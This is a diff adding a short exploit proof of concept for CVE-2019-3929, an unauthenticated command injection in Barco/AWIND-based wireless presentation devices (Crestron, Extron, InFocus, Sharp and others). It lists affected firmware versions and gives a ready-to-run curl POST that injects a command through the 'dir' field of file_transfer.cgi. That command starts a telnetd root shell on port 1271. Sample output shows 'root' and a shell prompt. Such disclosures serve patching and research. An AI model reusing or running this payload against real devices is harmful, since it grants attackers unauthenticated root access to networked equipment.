@@ -1,0 +1,40 @@
+##
+# Exploit Title: Barco/AWIND OEM Presentation Platform Unauthenticated Remote Command Injection 
+# Date: 05/01/2019
+# Exploit Author: Jacob Baines
+# Tested on: Crestron AM-100 1.6.0.2
+# CVE : CVE-2019-3929
+# PoC Video: https://www.youtube.com/watch?v=q-PIjnPcu2k
+# Advisory: https://www.tenable.com/security/research/tra-2019-20
+# Writeup: https://medium.com/tenable-techblog/eight-devices-one-exploit-f5fc28c70a7c
+# Affected Vendors/Device/Firmware:
+#  - Crestron AM-100 1.6.0.2
+#  - Crestron AM-101 2.7.0.1
+#  - Barco wePresent WiPG-1000P 2.3.0.10
+#  - Barco wePresent WiPG-1600W before 2.4.1.19
+#  - Extron ShareLink 200/250 2.0.3.4
+#  - Teq AV IT WIPS710 1.1.0.7
+#  - InFocus LiteShow3 1.0.16
+#  - InFocus LiteShow4 2.0.0.7
+#  - Optoma WPS-Pro 1.0.0.5
+#  - Blackbox HD WPS 1.0.0.5
+#  - SHARP PN-L703WA 1.4.2.3
+##
+
+The following curl command executes the commands "/usr/sbin/telnetd -p 1271 -l /bin/sh" and "whoami" on the target device:
+
+curl --header "Content-Type: application/x-www-form-urlencoded" \
+--request POST \
+--data "file_transfer=new&dir='Pa_Note/usr/sbin/telnetd -p 1271 -l /bin/shPa_Note'whoami" \
+--insecure https://192.168.88.250/cgi-bin/file_transfer.cgi
+
+Example:
+
+albinolobster@ubuntu:~$ curl --header "Content-Type: application/x-www-form-urlencoded" --request POST --data "file_transfer=new&dir='Pa_Note/usr/sbin/telnetd -p 1271 -l /bin/shPa_Note'whoami" --insecure https://192.168.88.250/cgi-bin/file_transfer.cgi
+root
+albinolobster@ubuntu:~$ telnet 192.168.88.250 1271
+Trying 192.168.88.250...
+Connected to 192.168.88.250.
+Escape character is '^]'.
+
+~/boa/cgi-bin #
